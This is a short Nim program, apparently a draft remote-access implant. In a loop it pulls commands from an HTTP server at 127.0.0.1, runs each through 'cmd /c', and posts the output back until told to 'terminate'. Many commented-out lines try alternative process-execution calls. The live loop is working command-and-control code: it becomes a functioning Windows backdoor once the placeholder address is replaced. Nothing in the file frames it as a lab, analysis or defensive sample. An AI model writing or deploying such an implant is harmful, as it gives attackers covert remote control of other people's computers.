import std/[osproc, httpclient, os, strutils]
while true:
    var client = newHttpClient()
    var command = client.getContent("http://127.0.0.1")
    echo command
    if "terminate" in command:
        break 
    else:
        let (lsalStr, errCode) = execCmdEx("cmd /c " & command)
        echo client.postContent("http://127.0.0.1", lsalStr)
        #let file = open("stdOut2.txt", fmAppend)
        #var outp = execProcess("cmd /c " & command)
        #var outp = execProcess(command, options={poInteractive})
        #echo outp
        #let v = execShellCmd(command)
        #echo v
        #let exef = startProcess(command, options={poEchoCmd, poUsePath, poEvalCommand, poStdErrToStdOut,poInteractive, poDaemon})
        #let s = exef.peekableOutputStream()
        #echo s.stdout()
        #echo "Error code: " & $errCode
        #echo "Output: " & lsalStr
        #var outpp = stdout.readLine(outp)
        #echo outpp
        #let errC = execCmd(command)
        #let s = exef.outputStream.readAll()
        #file.write(s)
        #file.close()
        #let entireFile = readFile("stdOut2.txt")
        
        #echo entireFile
sleep(100)